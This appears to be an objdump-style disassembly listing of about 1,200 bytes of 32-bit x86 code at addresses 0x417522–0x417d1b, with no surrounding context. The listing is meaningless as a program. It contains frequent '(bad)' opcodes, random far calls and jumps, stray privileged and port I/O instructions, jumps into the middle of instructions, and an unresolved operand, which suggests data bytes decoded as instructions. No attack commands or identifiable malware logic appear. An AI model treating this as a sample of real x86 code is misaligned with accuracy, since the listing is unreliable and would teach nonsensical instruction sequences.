  417522:	adc    bh,BYTE PTR [ecx]
  417524:	cld    
  417525:	fwait
  417526:	mov    ebx,0xab10f828
  41752b:	mov    eax,0x7385f88d
  417530:	pop    esi
  417531:	mul    bh
  417533:	pushf  
  417534:	nop
  417535:	sahf   
  417536:	jo     0x4175a0
  417538:	push   cs
  417539:	push   edi
  41753a:	popf   
  41753b:	xor    eax,0x69d5f94a
  417540:	push   edi
  417541:	inc    DWORD PTR [eax]
  417543:	test   DWORD PTR ds:0x40488aab,edx
  417549:	mov    ebp,0xb0a1d4db
  41754e:	pop    ds
  41754f:	cmp    ecx,DWORD PTR [ebx+0x10]
  417552:	nop
  417553:	mov    edx,0xd9af567e
  417558:	repnz scas eax,DWORD PTR es:[edi]
  41755a:	nop
  41755b:	cmp    al,0x77
  41755d:	sbb    eax,0x6c8f8888
  417562:	rcl    dh,0x0
  417565:	jmp    0x417544
  417567:	push   edx
  417568:	adc    eax,0xc91260d5
  41756d:	fsub   QWORD PTR [ecx-0x46e1cfaf]
  417573:	lahf   
  417574:	add    DWORD PTR [ebp+eiz*8-0x21],edx
  417578:	add    eax,DWORD PTR [edx+0x66a357ad]
  41757e:	push   ds
  41757f:	ins    WORD PTR es:[edi],dx
  417581:	jae    0x4175d3
  417583:	scas   eax,DWORD PTR es:[edi]
  417584:	jb     0x41754b
  417586:	imul   ebp,DWORD PTR ds:0x4ce9fe57,0xffffffaf
  41758d:	jno    0x417587
  41758f:	and    ebp,DWORD PTR [ecx]
  417591:	outs   dx,DWORD PTR ds:[esi]
  417592:	xchg   edi,eax
  417593:	fdiv   DWORD PTR [ebp-0x37]
  417596:	jge    0x417541
  417598:	and    DWORD PTR [ebp+0x285ea2ad],esi
  41759e:	sbb    BYTE PTR [edx],cl
  4175a0:	xor    ebx,DWORD PTR [esi]
  4175a2:	cdq    
  4175a3:	fild   QWORD PTR [edi]
  4175a5:	dec    esp
  4175a6:	dec    edi
  4175a7:	cwde   
  4175a8:	sahf   
  4175a9:	shr    BYTE PTR [esi-0x9bc829f],cl
  4175af:	fisub  DWORD PTR fs:[esi]
  4175b2:	mov    bl,0x12
  4175b4:	jae    0x4175c5
  4175b6:	sub    eax,0x70d4489b
  4175bb:	jno    0x4175be
  4175bd:	sub    eax,0xf58ad2b6
  4175c2:	call   0x6bfe:0x488ace06
  4175c9:	call   0xe304:0x11f6e312
  4175d0:	xchg   ecx,eax
  4175d1:	dec    ebx
  4175d2:	(bad)  
  4175d3:	push   ecx
  4175d4:	addr16 and eax,0x1c0b1ba7
  4175da:	popa   
  4175db:	jbe    0x417573
  4175dd:	cdq    
  4175de:	ret    
  4175df:	sub    ah,al
  4175e1:	jne    0x4175b2
  4175e3:	mov    al,ds:0x5bacca5f
  4175e8:	lods   al,BYTE PTR ds:[esi]
  4175e9:	(bad)  [esi-0xd244f5a]
  4175ef:	call   0xe934:0x31f301c
  4175f6:	es jne 0x417586
  4175f9:	clc    
  4175fa:	enter  0x12c1,0xad
  4175fe:	ss sti 
  417600:	call   0xe3279a5a
  417605:	and    cl,BYTE PTR [eax]
  417607:	sub    DWORD PTR [ebx-0x9c52f43],ecx
  41760d:	dec    eax
  41760e:	dec    edx
  41760f:	(bad)  
  417611:	add    BYTE PTR [edx+0x58],cl
  417614:	sbb    ah,BYTE PTR [edx+esi*2-0x23]
  417618:	fisubr WORD PTR [esi]
  41761a:	addr16 xchg ebp,eax
  41761c:	(bad)  
  41761d:	push   ds
  41761e:	or     bh,BYTE PTR [ebp+0x595169ac]
  417624:	pop    edx
  417625:	lock mov esp,0xae1232c4
  41762b:	push   ebx
  41762c:	sbb    DWORD PTR [ebx],edx
  41762e:	dec    edi
  41762f:	cld    
  417630:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417631:	jecxz  0x417698
  417633:	xor    eax,DWORD PTR [esi]
  417635:	jns    0x417645
  417637:	lods   eax,DWORD PTR ds:[esi]
  417638:	pop    edx
  417639:	push   ebp
  41763a:	into   
  41763b:	push   cs
  41763c:	inc    ebx
  41763d:	fnstsw WORD PTR [edx-0x1921302c]
  417643:	fild   QWORD PTR [edx]
  417645:	iret   
  417646:	lods   eax,DWORD PTR ds:[esi]
  417647:	dec    ebx
  417648:	mov    gs,eax
  41764a:	sti    
  41764b:	xor    esp,DWORD PTR ds:[ebx+0x51]
  41764f:	je     0x41761c
  417651:	xchg   DWORD PTR [ebp+0x2467667d],ebx
  417657:	outs   dx,DWORD PTR ds:[esi]
  417658:	lea    esp,[ebp+0x33]
  41765b:	pop    ds
  41765c:	clc    
  41765d:	fcomip st,st(7)
  41765f:	jbe    0x417633
  417661:	cmp    DWORD PTR [ecx-0x33],eax
  417664:	push   eax
  417665:	adc    edi,esi
  417667:	jae    0x4176e4
  417669:	xor    edi,edx
  41766b:	ret    
  41766c:	je     0x4175f5
  41766e:	(bad)  
  41766f:	xor    al,0x35
  417671:	jns    0x4176b8
  417673:	test   BYTE PTR [ebx+0x482b8ff8],dl
  417679:	jno    0x4176a9
  41767b:	mov    ah,0x2e
  41767d:	push   ecx
  41767e:	mov    dh,0x9b
  417680:	jb     0x41767e
  417682:	aam    0xae
  417684:	scas   eax,DWORD PTR es:[edi]
  417685:	jae    0x4176d2
  417687:	mov    ds:0xbbc35715,al
  41768c:	stc    
  41768d:	das    
  41768e:	clc    
  41768f:	mov    ebp,0xfe1c8e90
  417694:	jmp    0x2bc8bf75
  417699:	cs lahf 
  41769b:	sub    ch,BYTE PTR [eax]
  41769d:	xchg   edi,eax
  41769e:	enter  0xf1c7,0xe4
  4176a2:	sbb    eax,DWORD PTR [ebp+0x41]
  4176a5:	sbb    bh,BYTE PTR [edi]
  4176a7:	(bad)  
  4176a8:	int3   
  4176a9:	sbb    al,0xf3
  4176ab:	jne    0x417715
  4176ad:	dec    ecx
  4176ae:	hlt    
  4176af:	pop    edi
  4176b0:	mov    ebp,0x485e26e4
  4176b5:	push   ss
  4176b6:	xchg   DWORD PTR [edi+0x292b5cca],esi
  4176bc:	inc    esi
  4176bd:	and    al,0x9c
  4176bf:	adc    eax,0xd8335262
  4176c4:	scas   eax,DWORD PTR es:[edi]
  4176c5:	ins    BYTE PTR es:[edi],dx
  4176c6:	inc    edi
  4176c7:	ins    BYTE PTR es:[edi],dx
  4176c8:	mov    WORD PTR [edx+ebp*4-0x25974cc9],gs
  4176cf:	(bad)  
  4176d1:	mov    DWORD PTR [edi-0x7c03d371],esi
  4176d7:	lods   al,BYTE PTR ds:[esi]
  4176d8:	fs sbb dl,dh
  4176db:	jle    0x417697
  4176dd:	lods   al,BYTE PTR ds:[esi]
  4176de:	jns    0x417677
  4176e0:	ror    ecx,cl
  4176e2:	inc    ecx
  4176e3:	or     DWORD PTR [eax+0x8e88f65],ebp
  4176e9:	adc    BYTE PTR [ebx+0x1d],0x5
  4176ed:	ss lahf 
  4176ef:	bound  edi,QWORD PTR [ecx+0x35]
  4176f2:	shl    BYTE PTR [edi+0x3],0xda
  4176f6:	mov    dl,0x2f
  4176f8:	das    
  4176f9:	(bad)  
  4176fb:	mov    bl,0x43
  4176fd:	mov    edx,esp
  4176ff:	call   0xe5b5:0x95bb8fe8
  417706:	outs   dx,BYTE PTR ds:[esi]
  417707:	pop    ebp
  417708:	inc    esp
  417709:	(bad)  
  41770a:	cli    
  41770b:	sub    ah,ch
  41770d:	mov    al,ds:0xf63262fd
  417712:	mov    edx,0xb8bf768f
  417717:	or     bh,BYTE PTR [esi-0x57]
  41771a:	xchg   ebx,eax
  41771b:	inc    ecx
  41771c:	and    eax,0xdd372ddb
  417721:	jmp    0x417757
  417723:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417724:	sbb    DWORD PTR [edx],esp
  417726:	fs in  al,dx
  417728:	xchg   edi,eax
  417729:	scas   al,BYTE PTR es:[edi]
  41772a:	xchg   ebx,eax
  41772b:	leave  
  41772c:	test   DWORD PTR [edi+0x31],eax
  41772f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417730:	lods   eax,DWORD PTR ds:[esi]
  417731:	mov    dh,0x7e
  417733:	bswap  ecx
  417735:	push   ecx
  417736:	retf   
  417737:	sbb    DWORD PTR [eax-0x1f6e8430],edi
  41773d:	aaa    
  41773e:	dec    ebp
  41773f:	sub    esp,DWORD PTR [edi-0x6bbf3577]
  417745:	or     eax,0x8b6a1a13
  41774a:	dec    ebp
  41774b:	stos   BYTE PTR es:[edi],al
  41774c:	mov    eax,0x169a6b96
  417751:	test   eax,0xe04a5710
  417756:	test   DWORD PTR [eax-0x20],ecx
  417759:	(bad)  
  41775a:	jmp    0x85ab:0xdc65177f
  417761:	sbb    bh,BYTE PTR [ebx-0x24]
  417764:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417765:	sbb    eax,0x50b7e81c
  41776a:	mov    eax,ds:0xd67ab731
  41776f:	fiadd  WORD PTR [edx+0x72]
  417772:	jno    0x4177b3
  417774:	arpl   WORD PTR [ebx-0x69efa722],ax
  41777a:	aas    
  41777b:	push   ss
  41777c:	je     0x417733
  41777e:	and    al,0x50
  417780:	add    dh,BYTE PTR [ecx+0x6d412238]
  417786:	xor    al,ch
  417788:	mov    eax,ds:0x1d8b287f
  41778d:	and    eax,0x493323e
  417792:	jne    0x417729
  417794:	push   es
  417795:	inc    ebp
  417796:	in     eax,dx
  417797:	xchg   esi,eax
  417798:	mov    ecx,0x1abbfe0b
  41779d:	mov    bh,0x11
  41779f:	mov    edx,0xaa886a94
  4177a4:	mov    eax,0xeb6a3251
  4177a9:	xchg   esi,eax
  4177aa:	ret    
  4177ab:	jns    0x4177e2
  4177ad:	(bad)  
  4177af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177b0:	dec    esp
  4177b1:	pushf  
  4177b2:	sbb    DWORD PTR [ecx-0x29],esp
  4177b5:	pop    eax
  4177b6:	xchg   DWORD PTR ds:0x19bbc810,ebp
  4177bc:	leave  
  4177bd:	xchg   edx,eax
  4177be:	lea    ebx,[eax+0xc]
  4177c1:	stc    
  4177c2:	cs or  al,0x74
  4177c5:	and    BYTE PTR [ecx+0x451f8cb7],0xe4
  4177cc:	out    dx,eax
  4177cd:	ds scas al,BYTE PTR es:[edi]
  4177cf:	push   ebp
  4177d0:	lahf   
  4177d1:	sahf   
  4177d2:	add    al,0xe3
  4177d4:	test   BYTE PTR [ebx],cl
  4177d6:	dec    esi
  4177d7:	cwde   
  4177d8:	test   DWORD PTR [ecx+0x46],eax
  4177db:	imul   ebp,DWORD PTR [esi-0x3f],0x1d7c041a
  4177e2:	(bad)  
  4177e4:	and    DWORD PTR [ecx],ebx
  4177e6:	pop    es
  4177e7:	test   al,0x14
  4177e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177ea:	jmp    0xbdc896c8
  4177ef:	mov    esi,0x93be5642
  4177f4:	pop    esp
  4177f5:	push   esi
  4177f6:	and    DWORD PTR [esi+eax*1],0x5c
  4177fa:	sub    al,0x71
  4177fc:	in     eax,0xae
  4177fe:	xor    eax,0x3547de9d
  417803:	push   ss
  417804:	jp     0x4177c4
  417806:	sbb    ah,BYTE PTR [edi]
  417808:	xchg   DWORD PTR ds:0x71f4841,esi
  41780f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417810:	pop    ebp
  417811:	add    esi,eax
  417813:	sbb    al,0xcc
  417815:	loop   0x41780c
  417817:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417818:	clc    
  417819:	xchg   ebp,eax
  41781a:	sti    
  41781b:	lods   eax,DWORD PTR ds:[esi]
  41781c:	pop    es
  41781d:	addr16 jp 0x417865
  417820:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417821:	or     esi,DWORD PTR [eax-0x7cca8b00]
  417827:	in     eax,dx
  417828:	daa    
  417829:	jle    0x417803
  41782b:	mov    ah,0x35
  41782d:	nop
  41782e:	scas   al,BYTE PTR es:[edi]
  41782f:	mov    ds:0x6259dfe5,eax
  417834:	ja     0x417849
  417836:	mov    DWORD PTR [esi+0xc9f68ac],esi
  41783c:	gs inc edx
  41783e:	in     eax,0x28
  417840:	ja     0x4177d3
  417842:	adc    ch,BYTE PTR [ebx+esi*2]
  417845:	stc    
  417846:	std    
  417847:	push   0x547f484f
  41784c:	icebp  
  41784d:	int3   
  41784e:	(bad)  
  41784f:	sub    BYTE PTR [eax+0x6b62c8ec],ah
  417855:	xlat   BYTE PTR ds:[ebx]
  417856:	push   ebp
  417857:	jmp    0x393fb16c
  41785c:	add    edx,ebx
  41785e:	aas    
  41785f:	adc    DWORD PTR [eax-0x61],0x120fbc2f
  417866:	and    BYTE PTR [eax],bl
  417868:	inc    bl
  41786a:	xor    DWORD PTR [eax],ebx
  41786c:	imul   DWORD PTR [ebp-0x558e9deb]
  417872:	inc    esp
  417873:	in     al,dx
  417874:	and    BYTE PTR [ecx+0x7d],ch
  417877:	add    eax,0xea87dace
  41787c:	pop    eax
  41787d:	imul   al
  41787f:	int3   
  417880:	sub    al,BYTE PTR [edx-0x24]
  417883:	(bad)  
  417884:	sbb    al,0xb8
  417886:	xchg   BYTE PTR [edx],dh
  417888:	lods   al,BYTE PTR ds:[esi]
  417889:	call   0x6290:0xb55e9548
  417890:	sub    bh,BYTE PTR [ebx-0x58c56724]
  417896:	push   esi
  417897:	jle    0x417830
  417899:	xor    bh,BYTE PTR [esi]
  41789b:	(bad)  
  41789c:	test   al,0x57
  41789e:	xchg   BYTE PTR [edx-0x23],al
  4178a1:	in     al,dx
  4178a2:	xor    edi,DWORD PTR [edi]
  4178a4:	cmp    eax,0xfa004bee
  4178a9:	sub    eax,0xa23cd11a
  4178ae:	sahf   
  4178af:	mov    eax,0x2f317285
  4178b4:	xor    al,0x8e
  4178b6:	data16 adc ch,cl
  4178b9:	enter  0xc724,0x61
  4178bd:	out    dx,al
  4178be:	enter  0x65e3,0x80
  4178c2:	repz pushf 
  4178c4:	jge    0x41789f
  4178c6:	icebp  
  4178c7:	xchg   ebp,eax
  4178c8:	(bad)  
  4178c9:	in     al,0x37
  4178cb:	cmp    eax,0xdb976eb5
  4178d0:	int    0xbb
  4178d2:	test   DWORD PTR [edi],eax
  4178d4:	push   0x9abee6b2
  4178d9:	add    eax,0x29bccda7
  4178de:	push   ebp
  4178df:	or     BYTE PTR [edi+0x1c7dec70],dl
  4178e5:	fcom   DWORD PTR [edx+0x22]
  4178e8:	or     DWORD PTR [esi-0x29],edx
  4178eb:	(bad)  
  4178ec:	xor    eax,DWORD PTR [edi]
  4178ee:	ss enter 0x3441,0x6b
  4178f3:	(bad)  
  4178f4:	push   si
  4178f6:	mov    cl,BYTE PTR [ebx]
  4178f8:	retf   0xfcca
  4178fb:	mov    fs,WORD PTR [eax+0x54c421a8]
  417901:	sar    DWORD PTR [edx-0x30e835ac],0x64
  417908:	dec    ebx
  417909:	add    eax,0x986c7376
  41790e:	cmc    
  41790f:	icebp  
  417910:	das    
  417911:	jb     0x417970
  417913:	add    al,0xfb
  417915:	jle    0x41791c
  417917:	fwait
  417918:	scas   eax,DWORD PTR es:[edi]
  417919:	cdq    
  41791a:	enter  0xb9e8,0xbd
  41791e:	jecxz  0x41795c
  417920:	rcl    DWORD PTR [edi-0x21],0x79
  417924:	mov    edi,0xcd076ca1
  417929:	loopne 0x41792a
  41792b:	sbb    DWORD PTR [edi-0x57],0xfffffff8
  41792f:	mov    ebx,0x36b0516a
  417934:	dec    edx
  417935:	dec    ebx
  417936:	(bad)  
  417937:	sbb    eax,0x4302814
  41793c:	imul   edi,DWORD PTR [esi],0x2d
  41793f:	imul   esp,DWORD PTR [esi+0x4ee3797c],0xffffffe3
  417946:	dec    ecx
  417947:	inc    ebx
  417948:	adc    DWORD PTR [edi],0x3e
  41794b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41794c:	inc    edx
  41794d:	mov    al,ds:0xeb0fe565
  417952:	push   esi
  417953:	xor    al,0xf5
  417955:	neg    DWORD PTR [ecx+ebx*2]
  417958:	jbe    0x41794e
  41795a:	pusha  
  41795b:	inc    esi
  41795c:	sti    
  41795d:	xchg   ebx,eax
  41795e:	test   eax,0x4ad11e55
  417963:	ds cs call 0x69f9fc1a
  41796a:	call   DWORD PTR [esi-0x68]
  41796d:	pop    ss
  41796e:	aad    0x26
  417970:	mov    edx,0xcc820fd2
  417975:	push   eax
  417976:	mov    esi,0x186bac3b
  41797b:	jbe    0x417907
  41797d:	fwait
  41797e:	pop    edx
  41797f:	into   
  417980:	adc    al,0x48
  417982:	jle    0x41790a
  417984:	push   DWORD PTR [ebx-0xc]
  417987:	out    0x73,al
  417989:	(bad)  
  41798a:	mul    BYTE PTR [esi+edx*2]
  41798d:	ror    eax,cl
  41798f:	cmp    eax,0xd636e508
  417994:	xchg   esp,eax
  417995:	push   0xffffffc0
  417997:	pop    ds
  417998:	lds    esp,FWORD PTR [ebp+ebx*8-0x39ae7f3b]
  41799f:	div    ecx
  4179a1:	pop    ecx
  4179a2:	stos   BYTE PTR es:[edi],al
  4179a3:	fbld   TBYTE PTR fs:[ecx+0x74]
  4179a7:	push   0x211022d
  4179ac:	out    dx,al
  4179ad:	test   eax,0x3fc4361
  4179b2:	retf   
  4179b3:	push   0xffffffda
  4179b5:	add    eax,0xe1cc17be
  4179ba:	lock sub DWORD PTR [ecx+0x6a],esi
  4179be:	xor    DWORD PTR ds:0x79f44e83,ebp
  4179c4:	(bad)  
  4179c5:	pop    ss
  4179c6:	sbb    eax,0x4e773e50
  4179cb:	icebp  
  4179cc:	xor    ebx,DWORD PTR [edx+0x57]
  4179cf:	les    eax,FWORD PTR [ebp-0x672eb0fc]
  4179d5:	or     esp,DWORD PTR [ecx+ebx*4]
  4179d8:	or     DWORD PTR [edi+0x5c],0x68d6c111
  4179df:	sbb    eax,0x1b9b4b3e
  4179e4:	inc    esp
  4179e5:	dec    esp
  4179e6:	sub    esp,DWORD PTR [ecx-0x5]
  4179e9:	mov    dh,0x47
  4179eb:	mov    ds:0x585f877b,eax
  4179f0:	mov    ecx,0xf1e70aee
  4179f5:	add    DWORD PTR [ebx-0x4a],edi
  4179f8:	adc    DWORD PTR [esi],0xffffffef
  4179fb:	repz dec edx
  4179fd:	xor    ecx,ebp
  4179ff:	enter  0xe98,0x7c
  417a03:	adc    esi,DWORD PTR [ebp+0x5]
  417a06:	adc    eax,0xc628ca5c
  417a0b:	mov    edx,0xe37a0a41
  417a10:	mov    WORD PTR [esi-0xcdb75af],ss
  417a16:	clc    
  417a17:	shl    DWORD PTR [edi+0x47],1
  417a1a:	inc    ebx
  417a1b:	pusha  
  417a1c:	hlt    
  417a1d:	dec    esi
  417a1e:	imul   edx,DWORD PTR [eax],0x924de280
  417a24:	jle    0x417a19
  417a26:	or     al,0x7d
  417a28:	addr16 mov esi,0xa67d0052
  417a2e:	test   DWORD PTR [eax],0xe12df3aa
  417a34:	les    edi,FWORD PTR [edx+0x57]
  417a37:	dec    ebp
  417a38:	add    esp,0x41fea537
  417a3e:	mov    DWORD PTR [edi],ecx
  417a40:	push   es
  417a41:	ss mov ecx,0x64e93aa3
  417a47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a48:	jae    0x417aa3
  417a4a:	dec    ebp
  417a4b:	push   es
  417a4c:	mov    ecx,0x413fae79
  417a51:	nop
  417a52:	int3   
  417a53:	das    
  417a54:	ficom  DWORD PTR ss:[ecx-0x4c]
  417a58:	push   ecx
  417a59:	inc    BYTE PTR [eax+0x3f]
  417a5c:	jbe    0x417a57
  417a5e:	jnp    0x417a56
  417a60:	shr    BYTE PTR [esi],1
  417a62:	sahf   
  417a63:	repz enter 0x2636,0x2c
  417a68:	test   BYTE PTR [eax-0x23],bl
  417a6b:	sub    BYTE PTR [eax],al
  417a6d:	mov    eax,0x176f56b5
  417a72:	loope  0x417a0d
  417a74:	popa   
  417a75:	sahf   
  417a76:	int3   
  417a77:	push   es
  417a78:	inc    edi
  417a79:	sub    DWORD PTR [di+0x75a4],ecx
  417a7e:	and    BYTE PTR ss:[edx+0x68db6a0c],bl
  417a85:	xor    BYTE PTR [ebx+ebp*1-0xe],dl
  417a89:	jg     0x417ad0
  417a8b:	inc    edi
  417a8c:	and    DWORD PTR [esi],ebx
  417a8e:	push   edx
  417a8f:	mov    al,ds:0xed83b9e4
  417a94:	data16 cmp BYTE PTR [edi+0x172ae89],dh
  417a9b:	ficom  WORD PTR [edx+0x61]
  417a9e:	xchg   ecx,eax
  417a9f:	push   ecx
  417aa0:	scas   al,BYTE PTR es:[edi]
  417aa1:	ret    
  417aa2:	dec    esi
  417aa3:	cmp    eax,0x6f09675b
  417aa8:	push   esp
  417aa9:	adc    ebx,edi
  417aab:	test   eax,0x1d3453d5
  417ab0:	inc    eax
  417ab1:	cmp    ch,BYTE PTR ds:0x4b54d0a4
  417ab7:	mov    ebp,0xaa81ef72
  417abc:	pop    es
  417abd:	in     eax,dx
  417abe:	rcr    esi,0xed
  417ac1:	dec    eax
  417ac2:	cmp    BYTE PTR [esi],ch
  417ac4:	out    0x55,eax
  417ac6:	imul   edi,DWORD PTR [ebp+0x1d],0x39
  417aca:	dec    ebx
  417acb:	dec    ebx
  417acc:	test   BYTE PTR [edx+0x18825c78],ah
  417ad2:	cmp    ebx,edi
  417ad4:	(bad)  
  417ad5:	jnp    0x417a99
  417ad7:	pop    ebx
  417ad8:	inc    edx
  417ad9:	jo     0x417b2c
  417adb:	mov    edx,0x2ec5c0b5
  417ae0:	pop    esp
  417ae1:	(bad)  
  417ae2:	cmp    BYTE PTR [esi+0xe],cl
  417ae5:	sub    eax,0x4789acb4
  417aea:	cmp    DWORD PTR [esi],ebp
  417aec:	sti    
  417aed:	arpl   WORD PTR [esi-0x51ab7253],cx
  417af3:	inc    ecx
  417af4:	fwait
  417af5:	retf   
  417af6:	in     al,0x75
  417af8:	test   DWORD PTR [ebx+0x16363cdf],eax
  417afe:	frstor [ebx-0x7063ce17]
  417b04:	adc    esp,DWORD PTR [edx]
  417b06:	adc    BYTE PTR [ecx-0x14],ch
  417b09:	push   eax
  417b0a:	or     DWORD PTR [ebx],0x4deec627
  417b10:	popaw  
  417b12:	dec    esp
  417b13:	repnz stos DWORD PTR es:[edi],eax
  417b15:	mov    ecx,0x38492187
  417b1a:	ror    ebp,0x96
  417b1d:	int3   
  417b1e:	lea    eax,[ebx+0x3036e5b]
  417b24:	retf   0xcbbd
  417b27:	out    0xbc,eax
  417b29:	jge    0x417b37
  417b2b:	mov    DWORD PTR [ebp+0x153c26f],ebx
  417b31:	dec    eax
  417b32:	out    0x83,eax
  417b34:	inc    eax
  417b35:	daa    
  417b36:	jo     0x417af1
  417b38:	add    edi,DWORD PTR [ecx]
  417b3a:	sar    esp,1
  417b3c:	and    eax,0x26c90584
  417b41:	or     ebp,edx
  417b43:	mov    al,ds:0xff39fab4
  417b48:	das    
  417b49:	push   esi
  417b4a:	mov    ds:0x544c3730,eax
  417b4f:	shl    DWORD PTR [eax-0x24df4e2f],0x2c
  417b56:	pop    ebx
  417b57:	mov    cl,0xcf
  417b59:	lds    esp,FWORD PTR [edi-0x89c7f1d]
  417b5f:	mov    edx,0x22862b1d
  417b64:	push   0x41
  417b66:	lock add esp,edi
  417b69:	pushf  
  417b6a:	pushf  
  417b6b:	addr16 pop edx
  417b6d:	sub    al,0xda
  417b6f:	iret   
  417b70:	das    
  417b71:	jecxz  0x417b5b
  417b73:	rol    al,cl
  417b75:	lea    ebp,ds:0x37964ca8
  417b7b:	in     eax,dx
  417b7c:	jns    0x417b89
  417b7e:	(bad)  
  417b7f:	repz jo 0x417b47
  417b82:	push   ss
  417b83:	push   ds
  417b84:	mov    bh,0x4c
  417b86:	shl    esp,0x7a
  417b89:	dec    edx
  417b8a:	push   0x9064c34a
  417b8f:	pop    esi
  417b90:	adc    BYTE PTR [ebx+0x49],bh
  417b93:	cmp    al,0xce
  417b95:	push   cs
  417b96:	mov    al,ds:0x2a20309b
  417b9b:	repnz mov cl,0xb9
  417b9e:	adc    edi,ebx
  417ba0:	jae    0x417b52
  417ba2:	mov    edi,0x60b8680
  417ba7:	out    0x65,al
  417ba9:	mov    dl,0x67
  417bab:	push   0xa
  417bad:	and    DWORD PTR [ebp-0x6],esp
  417bb0:	xor    bh,0xb7
  417bb3:	mov    ch,0x7e
  417bb5:	data16 fs (bad) 
  417bb8:	out    dx,al
  417bb9:	adc    eax,0xb593cfd1
  417bbe:	pop    es
  417bbf:	jnp    0x417c03
  417bc1:	mov    ebx,gs
  417bc3:	into   
  417bc4:	int    0xd4
  417bc6:	push   0xaa053e84
  417bcb:	add    eax,0xbb66d479
  417bd0:	mov    ds:0x440b1d25,al
  417bd5:	outs   dx,BYTE PTR ds:[esi]
  417bd6:	xchg   edi,eax
  417bd7:	call   0x5ec51db6
  417bdc:	jbe    0x417b87
  417bde:	repz push ss
  417be0:	pop    edi
  417be1:	sub    ah,dh
  417be3:	ror    BYTE PTR [edx+0xbf6b5e9],0xa0
  417bea:	xor    eax,0x23bfd02a
  417bef:	ss push esp
  417bf1:	mov    eax,0x29f9d5b4
  417bf6:	in     al,0x7a
  417bf8:	xchg   BYTE PTR [edx-0x6b],bl
  417bfb:	bound  eax,QWORD PTR [ebx]
  417bfd:	and    ebp,0x6d52c4c7
  417c03:	ja     0x417c3a
  417c05:	call   0xa7a5:0x4aac7566
  417c0c:	jge    0x417c6a
  417c0e:	adc    al,ch
  417c10:	aas    
  417c11:	mov    bl,0x69
  417c13:	mov    ecx,0xd3f4c0d6
  417c18:	mov    WORD PTR [edi+0x12],?
  417c1b:	jecxz  0x417bc9
  417c1d:	ds in  eax,0xd6
  417c20:	clc    
  417c21:	xchg   BYTE PTR [esi-0x644ebf85],dh
  417c27:	bnd call 0x60ab4c7c
  417c2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c2e:	inc    ebx
  417c2f:	cmp    BYTE PTR [esi],dh
  417c31:	mov    ch,BYTE PTR [esi]
  417c33:	mov    edi,0xd7035c1
  417c38:	push   es
  417c39:	dec    ebp
  417c3a:	push   0xfffffff5
  417c3c:	pop    ebx
  417c3d:	jno    0x417cb9
  417c3f:	mov    edi,0x1c275a
  417c44:	inc    ebp
  417c45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c46:	jg     0x417cc3
  417c48:	xchg   esp,eax
  417c49:	rcr    BYTE PTR [eax-0x52],0x57
  417c4d:	dec    edi
  417c4e:	icebp  
  417c4f:	pusha  
  417c50:	mov    esp,DWORD PTR [ebx-0x26]
  417c53:	xchg   ecx,eax
  417c54:	(bad)  
  417c55:	jp     0x417bf2
  417c57:	sub    esi,DWORD PTR [eax-0x594f9a3b]
  417c5d:	and    esp,esp
  417c5f:	ss jp  0x417c5f
  417c62:	mov    bl,0x7b
  417c64:	lods   eax,DWORD PTR ds:[esi]
  417c65:	jmp    0x4b87b0e1
  417c6a:	mov    esp,0x20194ffb
  417c6f:	clc    
  417c70:	lds    ecx,FWORD PTR [esp+eiz*8+0x78]
  417c74:	(bad)  
  417c75:	fidiv  WORD PTR [edx+0x47]
  417c78:	push   ebx
  417c79:	adc    edi,DWORD PTR [esp+ebp*2]
  417c7c:	test   al,0x63
  417c7e:	push   ss
  417c7f:	mov    ecx,0xac270d71
  417c84:	push   ds
  417c85:	cmp    DWORD PTR [edi],ecx
  417c87:	push   eax
  417c88:	pop    ecx
  417c89:	dec    ebp
  417c8a:	mov    ebx,DWORD PTR [ecx]
  417c8c:	mov    al,ds:0x16a9d14f
  417c91:	enter  0xd8ff,0xec
  417c95:	pop    ds
  417c96:	aad    0xb2
  417c98:	jb     0x417c4b
  417c9a:	stos   DWORD PTR es:[edi],eax
  417c9b:	loop   0x417cbe
  417c9d:	sahf   
  417c9e:	retf   0xf768
  417ca1:	ror    BYTE PTR [eax-0x26],cl
  417ca4:	xchg   ebp,eax
  417ca5:	ja     0x417c36
  417ca7:	pop    ds
  417ca8:	iret   
  417ca9:	in     eax,0x6a
  417cab:	pop    es
  417cac:	xchg   ecx,eax
  417cad:	push   esi
  417cae:	sbb    DWORD PTR [esi+0x16],ebp
  417cb1:	or     BYTE PTR [edi-0x58],cl
  417cb4:	out    dx,eax
  417cb5:	xchg   esp,eax
  417cb6:	pop    es
  417cb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cb8:	mov    BYTE PTR [edx+edi*1-0x64418398],bl
  417cbf:	adc    edi,DWORD PTR [ebx-0x15]
  417cc2:	shl    DWORD PTR [edi+edx*1-0x5f8fcbe8],cl
  417cc9:	cmp    esi,esp
  417ccb:	sbb    cl,dh
  417ccd:	cmp    esp,DWORD PTR [esi-0x49fb7f46]
  417cd3:	push   ss
  417cd4:	imul   esi,DWORD PTR [esi+0x36],0xd5ea7942
  417cdb:	stc    
  417cdc:	adc    eax,0x87793cbc
  417ce1:	xor    dl,ch
  417ce3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ce4:	iret   
  417ce5:	arpl   WORD PTR [ecx],cx
  417ce7:	aam    0xb9
  417ce9:	shl    BYTE PTR [esi],1
  417ceb:	jmp    0x417ca7
  417ced:	push   esp
  417cee:	out    0x9a,al
  417cf0:	les    edx,FWORD PTR [edi-0x4bc07967]
  417cf6:	imul   ebx,eax,0x2a1bde43
  417cfc:	mov    edi,0x9ab0c64f
  417d01:	xchg   esi,eax
  417d02:	popa   
  417d03:	repz or DWORD PTR [ebp+0x3b],edx
  417d07:	popf   
  417d08:	mov    ebp,0x1d80bcc9
  417d0d:	xchg   DWORD PTR [edi+0x63],esp
  417d10:	mov    esp,0x7fa07946
  417d15:	ror    BYTE PTR [ebp-0xe5a6291],1
  417d1b:	push   ecx
